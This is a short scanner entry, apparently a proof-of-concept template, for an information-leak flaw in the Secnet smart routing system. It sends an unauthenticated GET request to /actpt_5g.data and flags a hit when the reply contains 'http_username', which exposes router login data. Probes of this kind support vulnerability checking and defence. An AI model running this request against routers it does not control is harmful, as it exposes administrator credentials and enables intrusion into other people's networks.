{
        'name': 'Secnet-智能路由系统 actpt_5g.data 信息泄露漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/actpt_5g.data',
            'headers': {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
            'filelocate': False
        },
        'response': {
            'status_code': False,
            'text': 'http_username'
        }}]
    }